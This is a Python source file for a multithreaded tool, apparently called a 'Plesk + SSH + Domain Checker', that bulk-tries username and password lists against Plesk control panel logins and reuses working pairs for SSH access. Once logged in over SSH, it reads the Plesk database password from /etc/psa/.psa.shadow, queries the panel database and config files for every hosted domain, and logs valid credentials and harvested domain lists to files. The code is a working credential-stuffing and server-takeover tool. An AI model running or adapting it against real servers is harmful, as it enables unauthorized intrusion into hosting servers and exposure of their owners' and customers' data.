#!/usr/bin/env python3
"""
Plesk + SSH + Domain Checker
- First checks Plesk login
- If Plesk login successful, automatically checks SSH login
- Then extracts and checks all domains hosted on the server
- Input format per line: <url_or_host[:port][/path]>[:]username[:]password
- Multithreaded, pause/resume with Ctrl+C
- Created by YamiFool - RoyalFool
"""

import argparse
import threading
import signal
import sys
import time
import socket
import paramiko
import warnings
import logging
import re
import json
from urllib.parse import urlparse, urljoin
from concurrent.futures import ThreadPoolExecutor, as_completed
import requests
from colorama import init, Fore, Style
import os
import subprocess

# Nonaktifkan warning
warnings.filterwarnings('ignore')
logging.disable(logging.CRITICAL)
requests.packages.urllib3.disable_warnings()

init(autoreset=True)
pause_event = threading.Event()
pause_event.set()

# Configuration
DEFAULT_PLESK_PORT = 8443
DEFAULT_SSH_PORT = 22

# Common form field names for Plesk/web login
COMMON_FORM_FIELDS = [
    ("login_name", "passwd"),
    ("login", "passwd"),
    ("username", "password"),
    ("login", "password"),
    ("user", "pass"),
    ("login_name", "password")
]

# Failure keywords in response body
FAIL_KEYWORDS = [
    "incorrect", "invalid", "failed", "wrong username", "wrong password", "login is invalid",
    "authentication failed", "invalid login", "access denied"
]

# Success indicators in cookies
SUCCESS_COOKIE_KEYWORDS = ["PLESKSESSID", "psa_session", "pleskd", "PHPSESSID"]
SUCCESS_LOCATION_KEYWORDS = ["index", "session", "dashboard", "panel", "login_up.php"]


def print_banner():
    """Display banner with Royal watermark"""
    banner = f"""
{Fore.CYAN}╔═══════════════════════════════════════════════════════════════════════════╗
║                                                                                   ║
║    ██████╗ ██╗     ███████╗███████╗██╗  ██╗    ██████╗  ██████╗ ███╗   ███╗     ║
║    ██╔══██╗██║     ██╔════╝██╔════╝██║ ██╔╝    ██╔══██╗██╔═══██╗████╗ ████║     ║
║    ██████╔╝██║     █████╗  ███████╗█████╔╝     ██║  ██║██║   ██║██╔████╔██║     ║
║    ██╔═══╝ ██║     ██╔══╝  ╚════██║██╔═██╗     ██║  ██║██║   ██║██║╚██╔╝██║     ║
║    ██║     ███████╗███████╗███████║██║  ██╗    ██████╔╝╚██████╔╝██║ ╚═╝ ██║     ║
║    ╚═╝     ╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝    ╚═════╝  ╚═════╝ ╚═╝     ╚═╝     ║
║                                                                                   ║
║                    🔥 PLESK + SSH + DOMAIN CHECKER v2.0 🔥                       ║
║                                                                                   ║
║                  Author: YamiFool - RoyalFool                                    ║
║                                                                                   ║
║              "Check Plesk, SSH, and All Domains in One Go"                       ║
║                                                                                   ║
╚═══════════════════════════════════════════════════════════════════════════════════╝
{Fore.RESET}"""
    print(banner)


def watermark():
    """Return watermark string"""
    return f"{Fore.LIGHTBLACK_EX}[Royal-DomainChecker]{Fore.RESET} "


def parse_line(line: str):
    """Parse input line into (raw_url, username, password)"""
    if not line:
        return None
    s = line.strip()
    if not s or s.startswith("#"):
        return None

    if "|" in s:
        parts = s.split("|")
        if len(parts) >= 3:
            return parts[0].strip(), parts[1].strip(), parts[2].strip()
        return None

    if ":" in s:
        parts = s.rsplit(":", 2)
        if len(parts) == 3:
            return parts[0].strip(), parts[1].strip(), parts[2].strip()
        return None

    return None


def normalize_input_url(raw: str, default_port: int = DEFAULT_PLESK_PORT):
    """Normalize URL from input"""
    raw = raw.strip()
    if raw.startswith("//"):
        raw = "https:" + raw

    if not raw.startswith("http://") and not raw.startswith("https://"):
        tmp = "https://" + raw
    else:
        tmp = raw

    parsed = urlparse(tmp)
    scheme = parsed.scheme or "https"
    host = parsed.hostname
    path = parsed.path or ""
    port = parsed.port

    if not host:
        head = raw.split("/", 1)[0]
        if ":" in head:
            host_part, port_part = head.split(":", 1)
            host = host_part
            try:
                port = int(port_part)
            except Exception:
                port = None
        else:
            host = head
            port = None
        path = "/" + raw.split("/", 1)[1] if "/" in raw else ""

    base_no_port = f"{scheme}://{host}"
    if port:
        base_no_port = f"{scheme}://{host}:{port}"

    final_port = port if port else default_port
    base_with_port = f"{scheme}://{host}:{final_port}"

    if path in (None, "", "/"):
        path = None

    return base_no_port, path, base_with_port, host


def hostname_resolvable(host: str) -> bool:
    """Check if hostname resolves"""
    try:
        socket.gethostbyname(host)
        return True
    except Exception:
        return False


def try_plesk_login(session: requests.Session, login_url: str, user: str, pwd: str, timeout: int = 15):
    """Try Plesk login with multiple field combinations"""
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    }
    
    for uname_field, pwd_field in COMMON_FORM_FIELDS:
        data = {uname_field: user, pwd_field: pwd}
        try:
            resp = session.post(login_url, data=data, headers=headers, 
                              allow_redirects=False, timeout=timeout, verify=False)
        except requests.RequestException as e:
            return False, f"REQUEST_ERROR:{e}", None

        # Check redirects
        loc = resp.headers.get("Location", "") or resp.headers.get("location", "")
        if loc and any(k in loc.lower() for k in SUCCESS_LOCATION_KEYWORDS):
            return True, f"REDIRECT:{uname_field}/{pwd_field}", resp

        # Check cookies
        scookies = resp.headers.get("Set-Cookie", "") or resp.headers.get("set-cookie", "")
        if scookies:
            low = scookies.lower()
            for kw in SUCCESS_COOKIE_KEYWORDS:
                if kw.lower() in low:
                    return True, f"COOKIE:{uname_field}/{pwd_field}", resp

        # Check body
        body = (resp.text or "").lower()
        fail_detected = False
        for fk in FAIL_KEYWORDS:
            if fk in body:
                fail_detected = True
                last_fail_reason = f"BODY_FAIL({fk})"
                break
        
        if not fail_detected:
            if any(k in body for k in ["logout", "session", "logout.php", "my account", "panel", "dashboard"]):
                return True, f"BODY_SUCCESS:{uname_field}/{pwd_field}", resp

        if resp.status_code in (302, 303) and scookies:
            return True, f"REDIRECT_COOKIE:{uname_field}/{pwd_field}", resp

    return False, "ALL_FIELD_TRIED_FAIL", None


def ssh_login_and_get_domains(host: str, port: int, username: str, password: str, timeout: int = 10):
    """
    SSH Login dan extract semua domain dari server Plesk
    Returns: (ssh_success, ssh_info, domains_list)
    """
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    result = {
        'success': False,
        'banner': None,
        'hostname': None,
        'system': None,
        'error': None,
        'domains': []
    }
    
    domains = []
    
    try:
        # Get SSH banner
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((host, port))
        banner = sock.recv(1024).decode('utf-8', errors='ignore').strip()
        sock.close()
        result['banner'] = banner[:100] if banner else "No banner"
        
        # Try login
        client.connect(
            hostname=host,
            port=port,
            username=username,
            password=password,
            timeout=timeout,
            allow_agent=False,
            look_for_keys=False,
            auth_timeout=timeout
        )
        
        # Get basic system info
        stdin, stdout, stderr = client.exec_command('hostname && uname -a', timeout=5)
        output = stdout.read().decode('utf-8').strip().split('\n')
        result['hostname'] = output[0] if output else host
        result['system'] = output[1] if len(output) > 1 else "Unknown"
        
        # METHOD 1: Get domains from Plesk database
        commands = [
            # Plesk 12+ - MySQL
            "mysql -uadmin -p`cat /etc/psa/.psa.shadow` psa -e 'SELECT name FROM domains' 2>/dev/null",
            # Plesk - via CLI
            "/usr/local/psa/bin/domain --list 2>/dev/null",
            # Check /var/www/vhosts/
            "ls -1 /var/www/vhosts/ 2>/dev/null | grep -v 'chroot' | grep -v 'default'",
            # Check Apache configs
            "grep -h ServerName /etc/httpd/conf.d/zz* 2>/dev/null | awk '{print $2}'",
            "grep -h ServerName /etc/apache2/sites-available/* 2>/dev/null | awk '{print $2}'",
            # Check nginx configs
            "grep -h server_name /etc/nginx/sites-available/* 2>/dev/null | awk '{print $2}' | tr -d ';'",
            # Check DNS zones
            "ls -1 /var/named/run-root/var/named/*.db 2>/dev/null | xargs -n1 basename 2>/dev/null | sed 's/.db//g'",
            "ls -1 /etc/bind/*.hosts 2>/dev/null | xargs -n1 basename 2>/dev/null | sed 's/.hosts//g'"
        ]
        
        for cmd in commands:
            try:
                stdin, stdout, stderr = client.exec_command(cmd, timeout=5)
                output = stdout.read().decode('utf-8').strip()
                if output:
                    for line in output.split('\n'):
                        domain = line.strip()
                        if domain and domain not in domains and '.' in domain and not domain.startswith('*'):
                            # Filter valid domains
                            if re.match(r'^[a-zA-Z0-9][a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$', domain):
                                domains.append(domain)
            except:
                continue
        
        # METHOD 2: Get from Plesk panel files
        plesk_paths = [
            "/usr/local/psa/admin/htdocs/domains/",
            "/var/www/vhosts/",
            "/var/www/vhosts/*/httpdocs/"
        ]
        
        for path in plesk_paths:
            try:
                cmd = f"ls -1 {path} 2>/dev/null | grep -v 'chroot' | grep -v 'default' | grep -v 'fs'"
                stdin, stdout, stderr = client.exec_command(cmd, timeout=5)
                output = stdout.read().decode('utf-8').strip()
                if output:
                    for line in output.split('\n'):
                        domain = line.strip()
                        if domain and domain not in domains and '.' in domain:
                            if re.match(r'^[a-zA-Z0-9][a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$', domain):
                                domains.append(domain)
            except:
                continue
        
        # METHOD 3: Parse from Plesk database directly
        try:
            # Get database password
            stdin, stdout, stderr = client.exec_command("cat /etc/psa/.psa.shadow", timeout=5)
            db_pass = stdout.read().decode('utf-8').strip()
            
            if db_pass:
                # Query domains from database
                query = "mysql -uadmin -p{} psa -e \"SELECT name, webspace_id, status FROM domains WHERE status='active'\" 2>/dev/null".format(db_pass)
                stdin, stdout, stderr = client.exec_command(query, timeout=10)
                output = stdout.read().decode('utf-8').strip()
                
                if output and 'name' in output:
                    lines = output.split('\n')[1:]  # Skip header
                    for line in lines:
                        parts = line.split()
                        if parts:
                            domain = parts[0]
                            if domain and domain not in domains:
                                domains.append(domain)
        except:
            pass
        
        # METHOD 4: Get from subscription list
        try:
            stdin, stdout, stderr = client.exec_command(
                "/usr/local/psa/bin/subscription --list 2>/dev/null | awk '{print $3}'", 
                timeout=5
            )
            output = stdout.read().decode('utf-8').strip()
            if output:
                for line in output.split('\n'):
                    domain = line.strip()
                    if domain and domain not in domains and '.' in domain:
                        domains.append(domain)
        except:
            pass
        
        # Remove duplicates and sort
        domains = sorted(list(set(domains)))
        
        # Check if domains are resolvable (optional)
        resolvable_domains = []
        for domain in domains[:50]:  # Limit to first 50 for performance
            try:
                socket.gethostbyname(domain)
                resolvable_domains.append(domain)
            except:
                pass  # Domain not resolvable, but still include in list
        
        result['success'] = True
        result['domains'] = domains
        result['resolvable_domains'] = resolvable_domains
        result['domain_count'] = len(domains)
        
    except paramiko.AuthenticationException:
        result['error'] = 'Auth Failed'
    except socket.timeout:
        result['error'] = 'Timeout'
    except socket.error as e:
        result['error'] = f'Socket: {str(e)[:30]}'
    except Exception as e:
        result['error'] = str(e)[:30]
    finally:
        client.close()
    
    return result['success'], result, domains


def check_domain_http(domain: str, timeout: int = 5):
    """Check if domain has active HTTP/HTTPS service"""
    result = {
        'domain': domain,
        'http': False,
        'https': False,
        'title': None,
        'server': None,
        'status_code': None
    }
    
    # Check HTTPS first
    try:
        resp = requests.get(f"https://{domain}", timeout=timeout, verify=False, allow_redirects=True)
        result['https'] = True
        result['status_code'] = resp.status_code
        result['server'] = resp.headers.get('Server', 'Unknown')
        
        # Extract title
        title_match = re.search(r'<title>(.*?)</title>', resp.text, re.IGNORECASE)
        if title_match:
            result['title'] = title_match.group(1).strip()[:50]
    except:
        pass
    
    # Check HTTP if HTTPS failed
    if not result['https']:
        try:
            resp = requests.get(f"http://{domain}", timeout=timeout, verify=False, allow_redirects=True)
            result['http'] = True
            result['status_code'] = resp.status_code
            result['server'] = resp.headers.get('Server', 'Unknown')
            
            title_match = re.search(r'<title>(.*?)</title>', resp.text, re.IGNORECASE)
            if title_match:
                result['title'] = title_match.group(1).strip()[:50]
        except:
            pass
    
    return result


def save_domains_to_file(host: str, username: str, domains: list, filename: str = "all_domains.txt"):
    """Save discovered domains to file"""
    with open(filename, "a", encoding="utf-8") as f:
        f.write(f"\n[{time.strftime('%Y-%m-%d %H:%M:%S')}] {host} ({username})\n")
        for domain in domains:
            f.write(f"  - {domain}\n")
        f.write(f"  Total: {len(domains)} domains\n")
        f.write(f"{'─'*50}\n")


def worker(item, success_file, fail_file, domains_file, timeout, debug):
    """Worker thread untuk cek Plesk + SSH + Domains"""
    raw_url, user, pwd = item
    base_no_port, path, base_with_port, host = normalize_input_url(raw_url)
    
    # Determine login endpoint for Plesk
    if path and path.lower().endswith(".php"):
        login_endpoint = base_no_port.rstrip("/") + path
    else:
        login_endpoint = base_no_port.rstrip("/") + "/login_up.php"
    
    if debug:
        print(f"{watermark()}{Fore.CYAN}[DEBUG] Host: {host}, Plesk URL: {login_endpoint}")
    
    # DNS Check
    if not hostname_resolvable(host):
        with threading.Lock():
            print(f"{watermark()}{Fore.YELLOW}[SKIP] {host} - DNS FAIL")
            with open(fail_file, "a", encoding="utf-8") as fh:
                fh.write(f"{raw_url}|{user}|{pwd} (DNS_FAIL)\n")
        return
    
    print(f"{watermark()}{Fore.CYAN}[1/3] Checking Plesk login: {host} ...")
    
    # STEP 1: Check Plesk Login
    session = requests.Session()
    plesk_ok, plesk_reason, plesk_resp = try_plesk_login(session, login_endpoint, user, pwd, timeout=timeout)
    
    if not plesk_ok:
        # Try fallback with default port
        fallback_login = base_with_port.rstrip("/") + "/login_up.php"
        if debug:
            print(f"{watermark()}{Fore.CYAN}[DEBUG] Trying fallback: {fallback_login}")
        plesk_ok2, plesk_reason2, _ = try_plesk_login(session, fallback_login, user, pwd, timeout=timeout)
        if plesk_ok2:
            plesk_ok, plesk_reason = plesk_ok2, plesk_reason2
    
    if not plesk_ok:
        with threading.Lock():
            print(f"{watermark()}{Fore.RED}[PLESK FAIL] {host} | {user} -> {plesk_reason}")
            with open(fail_file, "a", encoding="utf-8") as fh:
                fh.write(f"{raw_url}|{user}|{pwd} (PLESK_FAIL: {plesk_reason})\n")
        return
    
    print(f"{watermark()}{Fore.GREEN}[PLESK OK] {host} | {user} -> {plesk_reason}")
    
    # STEP 2: Check SSH and get domains
    print(f"{watermark()}{Fore.CYAN}[2/3] Checking SSH on {host}:{DEFAULT_SSH_PORT} ...")
    
    ssh_success, ssh_info, domains = ssh_login_and_get_domains(host, DEFAULT_SSH_PORT, user, pwd, timeout=timeout)
    
    with threading.Lock():
        if ssh_success:
            print(f"{watermark()}{Fore.GREEN}[SSH OK] {host} | {user}")
            print(f"{watermark()}    ├─ Hostname: {ssh_info.get('hostname', 'N/A')}")
            print(f"{watermark()}    └─ System: {ssh_info.get('system', 'N/A')[:50]}")
            
            # STEP 3: Process domains
            domain_count = len(domains)
            print(f"{watermark()}{Fore.CYAN}[3/3] Found {domain_count} domains on {host}")
            
            if domain_count > 0:
                # Show first 5 domains
                print(f"{watermark()}    ┌─ First 5 domains:")
                for i, domain in enumerate(domains[:5], 1):
                    print(f"{watermark()}    ├─ {i}. {domain}")
                if domain_count > 5:
                    print(f"{watermark()}    └─ ... and {domain_count-5} more")
                
                # Save all domains
                save_domains_to_file(host, user, domains, domains_file)
                
                # Quick check if domains are alive (optional, check first 10)
                if domain_count > 0:
                    print(f"{watermark()}    Checking domain status (first 5)...")
                    for domain in domains[:5]:
                        domain_status = check_domain_http(domain, timeout=3)
                        if domain_status['https'] or domain_status['http']:
                            proto = "HTTPS" if domain_status['https'] else "HTTP"
                            status = domain_status['status_code']
                            print(f"{watermark()}      • {domain} - {proto} ({status})")
            else:
                print(f"{watermark()}{Fore.YELLOW}    No domains found on this server")
            
            # Save combined success
            with open(success_file, "a", encoding="utf-8") as fh:
                fh.write(f"{raw_url}|{user}|{pwd} (PLESK_OK|SSH_OK|DOMAINS:{domain_count})\n")
            
            # Save detailed SSH + domains
            with open("ssh_domains_detail.txt", "a", encoding="utf-8") as fh:
                fh.write(f"\n{'='*60}\n")
                fh.write(f"Server: {host}\n")
                fh.write(f"Login: {user}:{pwd}\n")
                fh.write(f"Hostname: {ssh_info.get('hostname', 'N/A')}\n")
                fh.write(f"System: {ssh_info.get('system', 'N/A')}\n")
                fh.write(f"Banner: {ssh_info.get('banner', 'N/A')}\n")
                fh.write(f"Domains found: {domain_count}\n")
                if domains:
                    fh.write("Domain list:\n")
                    for domain in domains:
                        fh.write(f"  - {domain}\n")
                fh.write(f"{'='*60}\n")
            
        else:
            print(f"{watermark()}{Fore.RED}[SSH FAIL] {host} | {user} -> {ssh_info['error']}")
            with open(fail_file, "a", encoding="utf-8") as fh:
                fh.write(f"{raw_url}|{user}|{pwd} (PLESK_OK|SSH_FAIL: {ssh_info['error']})\n")
            
            # Still save Plesk-only success
            with open("plesk_only_success.txt", "a", encoding="utf-8") as fh:
                fh.write(f"{raw_url}|{user}|{pwd} (PLESK_OK|SSH_FAIL: {ssh_info['error']})\n")


def handle_ctrl_c(signum, frame):
    """Handle Ctrl+C for pause/resume"""
    pause_event.clear()
    print(f"\n{watermark()}{Fore.YELLOW}CTRL+C detected. Paused.")
    while True:
        choice = input(f"{watermark()}{Fore.CYAN}[e]xit or [r]esume? ").strip().lower()
        if choice == "e":
            print(f"{watermark()}{Fore.RED}Exiting...")
            sys.exit(0)
        if choice == "r":
            pause_event.set()
            print(f"{watermark()}{Fore.GREEN}Resuming...")
            break
        print(f"{watermark()}{Fore.YELLOW}Invalid. Enter 'e' or 'r'.")


def choose_sep(s: str):
    """Choose separator"""
    if s == "|" or s.lower() == "pipe":
        return "|"
    if s == ":" or s.lower() == "colon":
        return ":"
    return s


def create_example_file():
    """Create example input file"""
    example = """# Plesk+SSH+Domain Checker Credentials
# Format: URL:username:password or URL|username|password
# Created for Domain Discovery Tool

# Example with IP
http://192.168.1.1:8443:admin:password123

# Example with domain
https://plesk.example.com:8443|admin|secretpass

# Example with custom path
http://server.com/plesk/login.php:root:MyP@ssw0rd

# Example without port (will use default 8443 for Plesk)
https://plesk-server.com:admin:admin123

# Example with different SSH port (will still check standard 22)
http://10.0.0.1:8443:user:pass123
"""
    filename = "plesk_domain_credentials.txt"
    with open(filename, "w") as f:
        f.write(example)
    print(f"{watermark()}{Fore.GREEN}Example file created: {filename}")
    print(f"{watermark()}{Fore.YELLOW}Edit this file with your credentials!")


def main():
    parser = argparse.ArgumentParser(description="Plesk + SSH + Domain Checker")
    parser.add_argument("--file", "-f", help="Input file with credentials")
    parser.add_argument("--threads", "-t", type=int, default=5, help="Number of threads")
    parser.add_argument("--timeout", type=int, default=15, help="HTTP/SSH timeout in seconds")
    parser.add_argument("--out", "-o", default=None, help="Output file for successes")
    parser.add_argument("--fail", "-F", default=None, help="Output file for fails")
    parser.add_argument("--domains", "-d", default="discovered_domains.txt", help="Domain output file")
    parser.add_argument("--out-sep", default="|", help="Output separator")
    parser.add_argument("--debug", action="store_true", help="Enable debug mode")
    parser.add_argument("--example", action="store_true", help="Create example input file")
    parser.add_argument("--check-domains", action="store_true", help="Check if domains are alive (slower)")
    args = parser.parse_args()

    if args.example:
        create_example_file()
        return

    if not args.file:
        parser.print_help()
        print(f"\n{watermark()}{Fore.RED}Error: --file is required!")
        return

    infile = args.file
    workers = max(1, args.threads)
    timeout = args.timeout
    out_sep = choose_sep(args.out_sep)
    success_file = args.out or f"{os.path.splitext(infile)[0]}_success.txt"
    fail_file = args.fail or f"{os.path.splitext(infile)[0]}_failed.txt"
    domains_file = args.domains
    debug = args.debug

    # Prepare output files
    for f in [success_file, fail_file, domains_file, 
              "ssh_domains_detail.txt", "plesk_only_success.txt"]:
        open(f, "a", encoding="utf-8").close()

    try:
        with open(infile, "r", encoding="utf-8") as fh:
            lines = [ln.rstrip("\n") for ln in fh if ln.strip()]
    except FileNotFoundError:
        print(f"{watermark()}{Fore.RED}Input file not found: {infile}")
        sys.exit(1)

    entries = []
    for ln in lines:
        parsed = parse_line(ln)
        if not parsed:
            print(f"{watermark()}{Fore.YELLOW}[SKIP] Invalid format: {ln}")
            continue
        entries.append(parsed)

    print_banner()
    print(f"{watermark()}{Fore.YELLOW}[•] Loaded {len(entries)} entries from {infile}")
    print(f"{watermark()}{Fore.YELLOW}[•] Success file: {success_file}")
    print(f"{watermark()}{Fore.YELLOW}[•] Fail file: {fail_file}")
    print(f"{watermark()}{Fore.YELLOW}[•] Domains file: {domains_file}")
    print(f"{watermark()}{Fore.YELLOW}[•] SSH details: ssh_domains_detail.txt")
    print(f"{watermark()}{Fore.YELLOW}[•] Threads: {workers}")
    print(f"{watermark()}{Fore.YELLOW}[•] Timeout: {timeout}s")
    print()

    signal.signal(signal.SIGINT, handle_ctrl_c)

    start_time = time.time()
    
    with ThreadPoolExecutor(max_workers=workers) as executor:
        futures = [executor.submit(worker, item, success_file, fail_file, domains_file, timeout, debug) 
                  for item in entries]
        
        try:
            for future in as_completed(futures):
                while not pause_event.is_set():
                    time.sleep(0.1)
        except KeyboardInterrupt:
            pass

    elapsed = time.time() - start_time
    
    # Print summary
    print(f"\n{watermark()}{Fore.CYAN}{'═'*60}")
    print(f"{watermark()}{Fore.YELLOW}SUMMARY REPORT")
    print(f"{watermark()}{Fore.CYAN}{'─'*60}")
    print(f"{watermark()}Time elapsed: {elapsed:.2f} seconds")
    print(f"{watermark()}Check completed!")
    print(f"{watermark()}{Fore.CYAN}{'═'*60}")
    print(f"{watermark()}{Fore.YELLOW}Check output files for detailed results:")
    print(f"{watermark()}  • {success_file} (Plesk+SSH+Domain success)")
    print(f"{watermark()}  • {domains_file} (All discovered domains)")
    print(f"{watermark()}  • ssh_domains_detail.txt (Detailed SSH + domains)")
    print(f"{watermark()}  • plesk_only_success.txt (Plesk only)")
    print(f"{watermark()}{Fore.CYAN}{'═'*60}\n")


if __name__ == "__main__":
    main()
